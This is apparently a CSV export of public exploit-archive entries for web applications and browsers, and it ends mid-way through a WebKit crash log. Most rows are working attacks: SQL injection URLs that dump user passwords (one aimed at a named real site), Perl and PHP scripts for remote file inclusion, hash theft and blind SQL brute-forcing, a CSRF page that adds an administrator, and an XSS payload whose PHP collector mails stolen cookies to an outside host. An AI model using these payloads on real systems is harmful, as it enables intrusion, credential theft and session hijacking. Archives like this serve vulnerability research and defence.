8756,"asp inline Corporate Calendar - SQL Injection / Cross-Site Scripting 000000  00000     0000    0000  000  00 000000  0000000   0000  000000  00000  0    0   0      0    0  0    0  0   0   0    0  0    0  0    0  0    0  0   0  0    0   0     0  00 0 0        0  0    0    0  0      0  00 0  0    0  0    0  0    0   0     0 0 0 0 0        0  0    0    0  0  0   0 0 0 0  0    0  0    0  00000    0     0 0 0 0 0        0 0     00000   0000   0 0 0 0  00000   0    0  0    0   0     0 0 0 0 0        000     0    0  0  0   0 0 0 0  0  0    0    0  0    0   0     0  000  0        0  0    0    0  0      0  000   0  0    0    0  0    0   0   0  0       0    0  0   0   0    0  0    0  0       0   0   0   0 000000  0000000   000     0000  000  00 000000  0000000   000   000  00 00000    [+] Script               : ASP Talk   [+] Exploit Type         : Multiple Exploits (SQL/CSS)  [+] Google Dork          : intitle:""ASP inline corporate calendar""          inurl:.asp?id=  [+] Contact              : blackbeard-sql A.T hotmail.fr   --//--> Exploit :   1)Cross site scripting :  http://[website]/[script]/search.asp?keyword=<script>alert('bl@ckbe@rd');</script>&SearchIn=All  post = <script>alert('Bl@clbe@rD Is Here');</script>  2) Remote sql injection Exploit :  http://[website]/[script]/active_appointments.asp?sortby=Event_Title&order=DESC+union+select+(number of columns)+from+users  [peace xD]  # milw0rm.com [2009-05-21]",remote,webapps,1
5323,"mxBB Module mx_blogs 2.0.0-beta - Remote File Inclusion # mxBB Module mx_blogs 2.0.0-beta Remote File Include Exploit # # Vendor: http://www.mx-system.com # # Download: http://www.mx-system.com/index.php?page=4&action=file&file_id=405 # # Vulncode in: /includes/functions_weblog.php line 24 # # Greetz: str0ke, TheJT, rgod, Vallani, DNX, NBBN  use Getopt::Long; use URI::Escape; use IO::Socket;  $shellcode = ""Insert the url to shell here"";  main();  sub usage { print ""\mxBB Module mx_blogs 2.0.0-beta Remote File Include Expl\n""; print ""by bd0rk <www.soh-crew.it.tt>\n""; print ""-t, --ttarget\t(someone.com)\n""; print ""-f, --tshell\t(url to your shellcode)\n""; print ""-d, --dir\t(/mx_blogs)\n""; exit; }  sub main { GetOptions ('t|target=s' => \$target,'f|shell=s' => \$shell,'d|dir=s' => \$dir); usage() unless $target; $shellcode = $shell unless !$shell; $url = uri_escape($shellcode);  $sock = IO::Socket::INET->new(Proto=>""tcp"",PeerAddr=>""$target"",PeerPort=>""80"") or die ""\nConnection() failed.\n"";  print ""\nConnected to "".$target."", injecting shellcode.\n""; $sendurl = ""mx_root_path="".$url.""""; $sendlen = length($sendurl); print $sock ""POST "".$dir.""/includes/functions_weblog.php? HTTP/1.1\n""; print $sock ""Host: "".$target.""\n""; print $sock ""Connection: close\n""; print $sock ""Content-Type: application/x-www-form-urlencoded\n""; print $sock ""Content-Length: "".$sendlen.""\n\n""; print $sock $sendurl; print ""Attempted to include shellcode, Response:\n\n""; while($recvd = <$sock>) { print "" "".$recvd.""""; } exit; }  # milw0rm.com [2008-03-30]",remote,webapps,1
5425,"LightNEasy 1.2 - no database Remote Hash Retrieve # Author:	__GiReX__ # mySite:	girex.altervista.org # Date:		10/04/08  # CMS: 		LightNEasy 1.2 no database # Site:		lightneasy.org  # Bug:		Hash Disclosure # Exploit:	Remote Hash Retrieve   # Bug Explanation: LightNEasy/lightneasy.php    if($_GET['do']!=""login"" && $_GET['do']!=""sitemap"" && $_SESSION[$set['password']] != ""1"") unset($_GET['do']);   if($_POST['submit']!=$langmessage[120] && $_POST['submit']!=$langmessage[33] && $_SESSION[$set['password']] != ""1"") 	unset($_POST['submit']);  # $_GET['do'] is unset if we aren't admin or isn't login or sitemap    function content() {   ...   switch($_REQUEST['do']) {   ...   case ""setup"": {   ...   <input type=\""hidden\"" name=\""oldpassword\"" value=\"""".$set['password'].""\"" />  # content() diplays the HTML of the section passed with $_REQUEST['do'] # unset $_GET['do'] is not important if you switch the $_REQUEST one # you can only see the admin's hash in hidden input and not edit it becouse $_POST['submit'] is unset   #!/usr/bin/perl -w use strict; use LWP::UserAgent;  if(not defined $ARGV[0]) {      banner();      print ""[-] Usage: perl $0 [host] [path]\n"";      print ""[-] Example: perl $0 localhost /lightneasy/\n\n"";      exit; } my $client = new LWP::UserAgent or exit;  my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];    $target .=  $ARGV[1] unless not defined $ARGV[1];  banner(); my $response = $client->get($target . 'LightNEasy.php?do=setup');  if($response->is_success) {      if($response->as_string =~ /([a-f0-9]{40})/)      { 	  print ""[+] Admin's SHA1 Hash: $1 \n""; 	  print ""[+] Exploit Successfull\n"";      }      else       { 	  print ""[-] Unable to retrieve admin's hash\n""; 	  print ""[-] Exploit Failed\n"";      } } else {      print ""[-] Unable to request ${target}LightNEasy.php?do=setup\n"";      print ""[-] Exploit Failed\n""; }   sub banner {      print ""[+] LightNEasy 1.2 no database Password Retrieve Exploit\n"";      print ""[+] Coded by __GiReX__\n"";      print ""\n""; }  # milw0rm.com [2008-04-10]",remote,webapps,1
27727,"Microsoft Internet Explorer 6 - Nested OBJECT Tag Memory Corruption source: https://www.securityfocus.com/bid/17658/info  Microsoft Internet Explorer is prone to a memory-corruption vulnerability. This issue is due to a flaw in the application in handling nested OBJECT tags in HTML content.  An attacker could exploit this issue via a malicious web page to potentially execute arbitrary code in the context of the currently logged-in user, but this has not been confirmed. Exploit attempts likely result in crashing the affected application. Attackers could exploit this issue through HTML email/newsgroup postings or through other applications that employ the affected component.  Microsoft Internet Explorer 6 for Microsoft Windows XP SP2 is reportedly vulnerable to this issue; other versions may also be affected.  perl -e '{print ""<STYLE></STYLE>\n<OBJECT>\nBork\n""x32}' >test.html",remote,dos,1
5318,"Joomla! Component MyAlbum 1.0 - 'album' SQL Injection ------------------------------------------------------------------------------------------------- # Title   :  Joomla Component MyAlbum SQL Injection Vulnerability # Author  :  parad0x # D.Page  :  http://joomlacode.org/gf/project/myalbum/ ------------------------------------------------------------------------------------------------- http://[target]/index.php?option=com_myalbum&album=[SQL]  ------------------------------------------------------------------------------------------------- Example:  http://www.akparti.org.tr/disiliskiler/index.php?option=com_myalbum&album=-1+union+select+0,concat(username,char(32),password),2,3,4%20from%20jos_users/*  ------------------------------------------------------------------------------------------------- greetz : VoLqaN ------------------------------------------------------------------------------------------------- http://inso.host.sk  side note:   <name>myalbum</name>   <creationDate>01.06.2007</creationDate>   <author>HÃ¼seyin Bora ABACI</author>   <copyright>GNU/GPL</copyright>   <authorEmail>borkurt@hotmail.com</authorEmail>    <authorUrl>www.joomla.org</authorUrl>   <version>1.0</version>   <description>MyAlbum is practical,comfortable,fast simple a picture gallery component.</description>  # milw0rm.com [2008-03-28]",remote,webapps,1
24600,"myserver 0.7 - Directory Traversal source: https://www.securityfocus.com/bid/11189/info  MyServer is reported prone to a remote directory traversal vulnerability. This issue presents itself due to insufficient sanitization of user-supplied data. This vulnerability results in improper access to potentially sensitive files located outside of the document root of the web server.   MyServer version 0.7 is reportedly affected by this issue, however, other versions may be vulnerable as well.  ""GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../""",remote,remote,1
14382,"ActiTime 2.0-MA - Cross-Site Request Forgery         |------------------------------------------------------------------|         |                         __               __                      |         |   _________  ________  / /___ _____     / /____  ____ _____ ___  |         |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |         | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |         | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |         |                                                                  |         |                                       http://www.corelan.be:8800 |         |                                              security@corelan.be |         |                                                                  |         |-------------------------------------------------[ EIP Hunters ]--|  # Software      : Actitime 2.0-MA # Author          : Markot # Date             : July 16, 2010 # Reference    : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-058 # OS                : Windows # Tested on     : XP SP3 En (Virtual box) # Type of vuln : CSRF # Greetz to      : Corelan Security Team # http://www.corelan.be:8800/index.php/security/corelan-team-members/ # Script provided 'as is', without any warranty. # Use for educational purposes only. # Do not use this code to do anything illegal ! # # Note : you are not allowed to edit/modify this code. # If you do, Corelan cannot be held responsible for any damages this may cause.  0x00 : Vulnerability information   Product : ActiTime   Version :  2.0 MA   Vendor :  http://www.actimind.com   URL :  http://www.actitime.com   0x01 : Vendor description of software   From the vendor website:  ""Monitor personal time expenses in everyday work, do in-depth analysis of your staff's time-track, provide your customers  with information on the completed work, specify time estimates for the tasks and then compare reported working time with  estimates and more""   0x02 : Vulnerability details   CSRF  The discovered vulnerability allows an attacker to send a type of malicious exploit crafted specifically for ""ActiTime 2.0  MA""  whereby the Administrator could be tricked into executing unauthorized commands or actions.  0x03 : Proof of Concept  <html>  <body onload=""document.forms['Login'].submit();"">  <form method=""POST"" name=""Login"" action=""http://192.168.125.128:80/administration/useradd.do""> <input type=""hidden"" name=""submitted"" value=""1""/> <input type=""hidden"" name=""formDataModified"" value=""true""/> <input type=""hidden"" name=""redirectUrl"" value=""""/> <input type=""hidden"" name=""afterReloginUrl"" value=""""/> <input type=""hidden"" name=""beforeReloginUsername"" value=""""/> <input type=""hidden"" name=""username"" value=""Markot""/> <input type=""hidden"" name=""active"" value=""true""/> <input type=""hidden"" name=""passwordText"" value=""corelan""/> <input type=""hidden"" name=""passwordTextRetype"" value=""corelan""/> <input type=""hidden"" name=""firstName"" value=""Markot""/> <input type=""hidden"" name=""lastName"" value=""MarkotfromCorelan""/> <input type=""hidden"" name=""middleName"" value=""""/> <input type=""hidden"" name=""email"" value=""markot@corelan.be""/> <input type=""hidden"" name=""phone"" value=""""/> <input type=""hidden"" name=""fax"" value=""""/> <input type=""hidden"" name=""mobile"" value=""""/> <input type=""hidden"" name=""otherContact"" value=""""/> <input type=""hidden"" name=""workdayDurationStr"" value=""8:00""/> <input type=""hidden"" name=""overtimeTrackingLevel"" value=""0""/> <input type=""hidden"" name=""hireDateStr"" value=""Jun 30, 2010""/> <input type=""hidden"" name=""hireDateStrParsed"" value=""2010-05-30""/> <input type=""hidden"" name=""releaseDateStr"" value=""""/> <input type=""hidden"" name=""releaseDateStrParsed"" value=""""/> <input type=""hidden"" name=""userRate[0].effectiveDateStr"" value=""""/> <input type=""hidden"" name=""effectiveDate0"" value=""""/> <input type=""hidden"" name=""regularRate0"" value=""""/> <input type=""hidden"" name=""userRate[0].regularRateStr"" value=""""/> <input type=""hidden"" name=""overtimeRate0"" value=""""/> <input type=""hidden"" name=""userRate[0].overtimeRateStr"" value=""""/> <input type=""hidden"" name=""userRate[0].leaveRateStr[1].rate"" value=""""/> <input type=""hidden"" name=""userRate[0].leaveRateStr[2].rate"" value=""""/> <input type=""hidden"" name=""userRate[0].leaveRateStr[3].rate"" value=""""/> <input type=""hidden"" name=""userRate[0].rateMarkedToDelete"" value=""0""/> <input type=""hidden"" name=""userRate[1].effectiveDateStr"" value=""""/> <input type=""hidden"" name=""effectiveDate1"" value=""""/> <input type=""hidden"" name=""regularRate1"" value=""""/> <input type=""hidden"" name=""userRate[1].regularRateStr"" value=""""/> <input type=""hidden"" name=""overtimeRate1"" value=""""/> <input type=""hidden"" name=""userRate[1].overtimeRateStr"" value=""""/> <input type=""hidden"" name=""userRate[1].leaveRateStr[1].rate"" value=""""/> <input type=""hidden"" name=""userRate[1].leaveRateStr[2].rate"" value=""""/> <input type=""hidden"" name=""userRate[1].leaveRateStr[3].rate"" value=""""/> <input type=""hidden"" name=""userRate[1].rateMarkedToDelete"" value=""0""/> <input type=""hidden"" name=""userRate[2].effectiveDateStr"" value=""""/> <input type=""hidden"" name=""effectiveDate2"" value=""""/> <input type=""hidden"" name=""regularRate2"" value=""""/> <input type=""hidden"" name=""userRate[2].regularRateStr"" value=""""/> <input type=""hidden"" name=""overtimeRate2"" value=""""/> <input type=""hidden"" name=""userRate[2].overtimeRateStr"" value=""""/> <input type=""hidden"" name=""userRate[2].leaveRateStr[1].rate"" value=""""/> <input type=""hidden"" name=""userRate[2].leaveRateStr[2].rate"" value=""""/> <input type=""hidden"" name=""userRate[2].leaveRateStr[3].rate"" value=""""/> <input type=""hidden"" name=""userRate[2].rateMarkedToDelete"" value=""0""/> <input type=""hidden"" name=""userRate[3].effectiveDateStr"" value=""""/> <input type=""hidden"" name=""effectiveDate3"" value=""""/> <input type=""hidden"" name=""regularRate3"" value=""""/> <input type=""hidden"" name=""userRate[3].regularRateStr"" value=""""/> <input type=""hidden"" name=""overtimeRate3"" value=""""/> <input type=""hidden"" name=""userRate[3].overtimeRateStr"" value=""""/> <input type=""hidden"" name=""userRate[3].leaveRateStr[1].rate"" value=""""/> <input type=""hidden"" name=""userRate[3].leaveRateStr[2].rate"" value=""""/> <input type=""hidden"" name=""userRate[3].leaveRateStr[3].rate"" value=""""/> <input type=""hidden"" name=""userRate[3].rateMarkedToDelete"" value=""0""/> <input type=""hidden"" name=""userRate[4].effectiveDateStr"" value=""""/> <input type=""hidden"" name=""effectiveDate4"" value=""""/> <input type=""hidden"" name=""regularRate4"" value=""""/> <input type=""hidden"" name=""userRate[4].regularRateStr"" value=""""/> <input type=""hidden"" name=""overtimeRate4"" value=""""/> <input type=""hidden"" name=""userRate[4].overtimeRateStr"" value=""""/> <input type=""hidden"" name=""userRate[4].leaveRateStr[1].rate"" value=""""/> <input type=""hidden"" name=""userRate[4].leaveRateStr[2].rate"" value=""""/> <input type=""hidden"" name=""userRate[4].leaveRateStr[3].rate"" value=""""/> <input type=""hidden"" name=""userRate[4].rateMarkedToDelete"" value=""0""/> <input type=""hidden"" name=""rightGranted[9]"" value=""on""/> <input type=""hidden"" name=""rightGranted[5]"" value=""on""/> <input type=""hidden"" name=""customersProjectsSelector.customerList"" value=""""/> <input type=""hidden"" name=""customersProjectsSelector.projectList"" value=""""/> <input type=""hidden"" name=""customersProjectsSelector.coarseSelection"" value=""specific""/>  </form> </body> </html>    0x04 : Author/Vendor communication  July 4 2010 : Vendor contacted  July 11 2010: reminder sent, no feedback received  July 16 2010: public disclosure      This transmission is intended only for use by the intended recipient(s).  If you are not an intended recipient you should not read, disclose, copy, circulate or in any other way use the information contained in this transmission.  The information contained in this transmission may be confidential and/or privileged.  If you have received this transmission in error, please notify the sender immediately and delete this transmission including any attachments.",remote,webapps,1
6134,"PHPTest 0.6.3 - SQL Injection ######################################################################################## # #   Name   : phpTest 0.6.3 (picture.php image_id) Remote SQL Injection Vulnerability #   Author : cOndemned [ Dark-Coders ] #   Dork   : sorry, today no dork [; #   Greetz : ZaBeaTy, str0ke, GregStar, Voo|doo, ixos, 0in, suN8Hclf, TBH, Avantura :* # ########################################################################################  Source code of ""picture.php"" :      24.    pt_register('GET', 'image_id');     25.     26.    if (isset($image_id)) {     27.        $result = $db->query(""SELECT filetype, data FROM images WHERE image_id = $image_id"");     28.     29.        if ($db->num_rows($result)) {     30.            $row = $db->fetch_object($result);     31.            header(""Content-type: $row->filetype"");     32.            echo $row->data;  Description :      line 24 - $image_id is taken from user using $_GET method     line 27 - There is absolutly no validation of $image_id + We can se amount of columns - 2     line 31 - header type doesn't matter....     line 32 - Result of MySQL Query is being printed here.          Exploit :      http://[host]/[phpTest]/picture.php?image_id=-1+union+select+1,concat_ws(0x3a3a,username,password)+from+users/*  # milw0rm.com [2008-07-25]",remote,webapps,1
38113,"vBulletin ajaxReg Module - SQL Injection source: https://www.securityfocus.com/bid/56877/info  The ajaxReg module for vBulletin is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   #!/usr/bin/php <?  # vBulletin 3.x/4.x AjaxReg remote Blind SQL Injection Exploit # https://www.example.com/-4HcW64E57CI/ULWN9mDnK8I/AAAAAAAAABo/cc0UA9eV_ak/s640/11-26-2012%25206-02-5s3%2520AM.png # livedemo : http://www.example.com/watch?v=LlKaYyJxH7E # check it : http://www.example.com/vBulletin/clientscript/register.js  function usage () {     echo         ""\n[+] vBulletin 3.x/4.x AjaxReg remote Blind SQL Injection Exploit"".         ""\n[+] Author: Cold z3ro"".         ""\n[+] Site  : http://www.example.com | www.example.com"".         ""\n[+] vandor: http://www.example.com/forum/showthread.php?t=144869"".         ""\n[+] Usage : php 0day.php <hostname> <path> [userid] [key]"".         ""\n[+] Ex.   : php 0day.php www.example.com /vBulletin/ 1 abcdefghijklmnopqrstuvwxyz"".         ""\n[+] Note. : Its a 0day exploit\n\n"";     exit (); }   function check ($hostname, $path, $field, $pos, $usid, $char) {     $char = ord ($char);     $inj = 'ajax.php?do=CheckUsername&param=';   $inj.=  ""admin'+and+ascii(substring((SELECT/**/{$field}/**/from/**/user/**/where/**/userid={$usid}),{$pos},1))={$char}/*"";   $culr = $hostname.$path.$inj;   $curl = curl_init();   curl_setopt ($curl, CURLOPT_URL, $culr );   curl_setopt($curl, CURLOPT_HEADER, 1);   curl_setopt($curl, CURLOPT_VERBOSE, 0);     ob_start();     curl_exec ($curl);     curl_close ($curl);     $con = ob_get_contents();     ob_end_clean();   if(eregi('Invalid',$con))       return true;     else         return false; }     function brutechar ($hostname, $path, $field, $usid, $key) {     $pos = 1;     $chr = 0;     while ($chr < strlen ($key))     {         if (check ($hostname, $path, $field, $pos, $usid, $key [$chr]))         {             echo $key [$chr];             $chr = -1;             $pos++;         }         $chr++;     } }     if (count ($argv) != 4)     usage ();   $hostname = $argv [1]; $path = $argv [2]; $usid = $argv [3]; $key = $argv [4]; if (empty ($key))     $key = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"";   echo ""[+] Username: ""; brutechar ($hostname, $path, ""username"", $usid, $key); echo ""\n[+] Password: ""; brutechar ($hostname, $path, ""password"", $usid, $key); echo ""\n[+] Done..""; echo ""\n[+] It's not fake, its real.""; # word to 1337day.com, stop scaming me  ?>",remote,webapps,1
47613,"Adrenalin Core HCM 5.4.0 - 'prntDDLCntrlName' Reflected Cross-Site Scripting # Exploit Title: Adrenalin Core HCM 5.4.0 - 'prntDDLCntrlName' Reflected Cross-Site Scripting # Google Dork: NA # Date: 2018-09-06 # Exploit Author: Rishu Ranjan (Cy83rl0gger) # Vendor Homepage: https://www.myadrenalin.com/ # Software Link: https://www.myadrenalin.com/core-hcm/ # Version: 5.4.0 (REQUIRED) # Tested on: NA # CVE : CVE-2018-12650 # Type: webapps # Platform: Multiple  # Description # ==================== # A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in Adrenalin Core HCM v5.4.0 HRMS Software.  # The user supplied input containing malicious JavaScript is echoed back as it is in JavaScript code in an HTML response.  URL ==================== https://<Host:port>/myadrenalin/AppMaint/ApplicationtEmployeeSearch.aspx?popToken=emp&prntFrmName=AppAccFrm76096%22%3balert(1)%2f%2f150&prntDDLCntrlName=hdnEmpSearch&HRShow=0&CntrlType=txt&Applicationid=&Grade=undefined  https://<Host:port>/Adrenalin/AppMaint/ApplicationtEmployeeSearch.aspx?popToken=emp&prntFrmName=AppAccFrm76096%22%3balert(1)%2f%2f150&prntDDLCntrlName=hdnEmpSearch&HRShow=0&CntrlType=txt&Applicationid=&Grade=undefined  Parameter ==================== prntDDLCntrlName prntFrmName  Attack Type ==================== Remote  CVE Impact Other ==================== Allows an attacker to input malicious JavaScript which can steal cookie, redirect them to other malicious website, etc.  Reference ==================== https://nvd.nist.gov/vuln/detail/CVE-2018-12650 https://www.knowcybersec.com/2018/10/CVE-2018-12650-reflected-XSS.html  Discoverer ==================== Rishu Ranjan",remote,webapps,1
10645,"PBX Phone System 2.x - Multiple Vulnerabilities PenTest Information: ==================== Global-Evolution Security Team (~remove) discover multiple Vulnerabilities on PBX Phone System Application. An attacker can get sensitive customer/admin session-data over multiple Cross-Site-Scripting vulnerabilities.   Details ======= Tested on OS:		Windows 7 VBox Tested with Software:	Mozilla Firefox 3.5.x (Portable|Mod)  Vulnerable Products: 	PBX Business Phone Application Affected Versions: 	v2.6.x & 2.5.2.x Vulnerability Type:	Multiple Cross Site Scripting (Server-Side & Client-Side) Security-Risk: 		Low & Medium (1.1 & 1.2)  Vendor-URL: 		http://www.freepbx.org/ Source-URL:		http://www.freepbx.org/download-freepbx  Vendor-Status: 		Not Informed Patch/Fix-Status:	Fixed version not released Advisory-Status:	Published | 25.12.2009  Advisory-URL: 		*censored Report-URL:		*censored  GE DB-ID:           	() CVE-ID:             	() OSVDB-ID:           	()     Introduction ============ It's Hard to Beat Free FreePBX is for both developers and people searching for a Business Phone System.  The new to FreePBX, Asterisk® or FreeSWITCH by PBX. FreePBX is an easy to use GUI (graphical user interface)  that controls and manages Asterisk, the world's most popular open source telephony engine software. FreePBX  has been developed and hardened by thousands of volunteers over tens of thousands man hours. FreePBX has been  downloaded over 5,000,000 times and estimates over 500,000 active phone systems. If you don't know about FreePBX,  you are probably paying too much for your phone system. Government in Europe & USA mostly use that Software to  configure Phone System inside of the offices.  (Copy from the Vendor's Homepage: http://www.freepbx.org/)    More Details ============ 1.1 Multiple XSS Vulnerabilities are detected on client-side(persistent). An attacker with low privilegs is able  to include own bad script routines on client-side(Example;PHP;JS) of the phone application. Attackers can get Session-Data(Cookies)  of customers/admins over multiple Cross Site Scripting Vulnerabilities.  Vulnerable Module:	 			[+] Trunk/Tech  Path:	/admin/admin/	 File:	config.php	 Para:	?display=trunks&tech=   1.2 Multiple XSS Vulnerabilities are detected on server-side. An attacker with low privilegs is able  to include own bad script routines on server-side(Example;PHP;JS) of the phone application. Attackers can get Session-Data(Cookies)  of customers/admins over multiple Cross Site Scripting Vulnerabilities.  Vulnerable Module:	 			[+] Add Recordings 			[+] Add Zap Channel  Proof of Concept ================ This vulnerabilities can be exploited ...  1.1  location.href='https://127.0.0.1:8080/admin/admin/config.php?display=trunks&tech=%3C/script%3E%20%22%3E %3Cscript%20src%3Dhttp%3A//global-evolution.info/etc/grep.php%3E%3C/script%3E?nice='+escape(document.cookie)  <? $cookie = $_GET['nice']; $ip = getenv(""REMOTE_ADDR""); $Time = date(""l dS of F Y h:i:s A"");  $msg = ""Cookie: $cookie\nIP Address: $ip\Time: $Time""; $subject = ""cookie""; mail(""notification@global-evolution.info"", $subject, $msg); header (""location: http://127.0.0.1:8080/admin/""); ?>    1.2  <form name=""editZapchandid"" action="""" method=""post"" onsubmit=""return checkZapchandid(editZapchandid);""> <input type=""hidden"" name=""extdisplay"" value=""""> <input type=""hidden"" name=""channel"" value=""""> <input type=""hidden"" name=""action"" value=""add""> <table><tr><td colspan=""2""><h5>Add Channel<hr></h5></td></tr> <tr><td><a href=""#"" class=""info"">Channel:<span>The Zap Channel number to map to a DID</span></a></td> <td><input size=""5"" type=""text"" name=""channel"" value="""" tabindex=""1""></td> </tr><tr><td><a href=""#"" class=""info"">Description:<span>A useful description describing this channel</span></a></td> <td><input size=""40"" type=""text"" name=""description"" value=""INSERT 0WN SCRIPTCODE HERE!!!"" tabindex=""2""></td> </tr><tr><td><a href=""#"" class=""info"">DID:<span>The DID that this channel represents. The incoming call on this channel  will be treated as if it came in with this DID and can be managed with Inbound Routing on DIDs</span></a></td> <td><input size=""40"" type=""text"" name=""did"" value=""""  tabindex=""3""/></td> </tr><tr><td colspan=""2""><br><input name=""Submit"" type=""submit"" value=""Submit Changes"" tabindex=""4""> </td></tr></table></form>    Fix / Patch ============ Restrict on the modules Zap Channel, Recordings & the Tech/Trunk input fields with a more  secure mask like (;:->""<'*"",.[]) & format it with specialchars to get a secure output.      Security Risk ============= 1.1 An attacker is able to get sessioninformation or include bad script routines with xss on client-side(not persistent).  The security risk is estimated as low because of client-side.  1.2 An attacker is able to get sessioninformation or include bad script routines with xss on server-side(persistent).  The security risk is estimated as medium because of server-side.    Authors ======= The author & writer is part of the private ""Global-Evolution"" Security(GESEC) Group.  GESEC Vulnerability-Research Team protects software, services, applications & informs the vendors on a secured base. More information about Global-Evolution Security ... global-evolution.info    ________.__        ___.          .__            ___________           .__          __  .__                 /  _____/|  |   ____\_ |__ _____  |  |           \_   _____/__  ______ |  |  __ ___/  |_|__| ____   ____   /   \  ___|  |  /  _ \| __ \\__  \ |  |    ______  |    __)_\  \/ /  _ \|  | |  |  \   __\  |/  _ \ /    \ (c) \    \_\  \  |_(  <_> ) \_\ \/ __ \|  |__ /_____/  |        \\   (  <_> )  |_|  |  /|  | |  (  <_> )   |  \  \______  /____/\____/|___  (____  /____/         /_______  / \_/ \____/|____/____/ |__| |__|\____/|___|  /         \/                \/     \/                       \/                                            \/",remote,webapps,1
7565,"StormBoard 1.0.1 - SQL Injection ============================================================================== _________________________________{Ù„Ø§Ø§Ù„Ù‡ Ø§Ù„ÙŠ Ù„Ù„Ù‡ Ù…Ø­Ù…Ø¯ Ø±Ø³ÙˆÙ„ Ù„Ù„Ù‡}_________________________________  ---------------------------------(Samir-M)----------------------------------        StormBoard Version 1.0.1 (thread.php id=) SQL Injection Vulnerability  by  : Samir-M  Msn : Km7@Hotmail.De  from: Morocco  ---------------------------------------------------------------------------- darck :  ""Powered by : StormBoard Version 1.0.1""  ----------------------------------------------------------------------------   Exploit:  site.com/thread.php?id=-null union select 1,2,3,4,5,6,7,8,concat(user_name,0x3e,user_password),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 from users   Dome: al-andalos.com/thread.php?id=-null+union+all+select+1,2,3,4,5,6,7,8,concat(user_name,0x3e,user_password),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25+from+users--   Login: site.com/admin   ---------------------------------------------------------------------------- Samir-M > A-flow > Gess-Inject0r > Wassim-Net  ---------------------------------------------------------------------------- _______________________________________________________________________________ ===============================================================================  # milw0rm.com [2008-12-23]",remote,webapps,1
43170,"WebKit - 'WebCore::RenderText::localCaretRect' Out-of-Bounds Read /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1348  There is an out-of-bounds read security vulnerability in WebKit. The vulnerability was confirmed on ASan build of WebKit nightly.  PoC:  ================================================================= */  <style> * { max-height: 0; -webkit-text-combine: horizontal; -webkit-writing-mode: vertical-rl; } </style> <script> function go() {   window.getSelection().setPosition(h,1);   document.execCommand(""delete"", false);   document.execCommand(""delete"", false); } </script> <body onload=go()> <listing> <dd contenteditable=""true""> <h3 id=""h"">I>EO~P</h3>  /* =================================================================  ASan log:  ================================================================= ==30388==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6030000f5de6 at pc 0x00010ff1c575 bp 0x7fff5a427300 sp 0x7fff5a4272f8 READ of size 2 at 0x6030000f5de6 thread T0 ==30388==WARNING: invalid path to external symbolizer! ==30388==WARNING: Failed to use and restart external symbolizer!     #0 0x10ff1c574 in WTF::StringImpl::at(unsigned int) const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2b574)     #1 0x110edd834 in WebCore::InlineTextBox::isLineBreak() const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xfec834)     #2 0x110ee587f in WebCore::InlineTextBox::positionForOffset(unsigned int) const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xff487f)     #3 0x1127d5bda in WebCore::RenderText::localCaretRect(WebCore::InlineBox*, unsigned int, WebCore::LayoutUnit*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x28e4bda)     #4 0x112fd2830 in WebCore::VisiblePosition::localCaretRect(WebCore::RenderObject*&) const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x30e1830)     #5 0x1107e0e5d in WebCore::localCaretRectInRendererForCaretPainting(WebCore::VisiblePosition const&, WebCore::RenderBlock*&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x8efe5d)     #6 0x110a5912d in WebCore::CaretBase::updateCaretRect(WebCore::Document*, WebCore::VisiblePosition const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb6812d)     #7 0x110a6377b in WebCore::FrameSelection::recomputeCaretRect() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb7277b)     #8 0x110a5b2f8 in WebCore::FrameSelection::updateAppearance() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb6a2f8)     #9 0x110a5aee7 in WebCore::FrameSelection::updateAndRevealSelection(WebCore::AXTextStateChangeIntent const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb69ee7)     #10 0x110a67a6f in WebCore::FrameSelection::updateAppearanceAfterLayoutOrStyleChange() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb76a6f)     #11 0x110a6d63a in WebCore::FrameView::performPostLayoutTasks() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb7c63a)     #12 0x110a75d4a in WebCore::FrameView::layout(bool) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb84d4a)     #13 0x110681b10 in WebCore::Document::updateLayout() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x790b10)     #14 0x110688542 in WebCore::Document::updateLayoutIgnorePendingStylesheets(WebCore::Document::RunPostLayoutTasks) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x797542)     #15 0x11061562b in 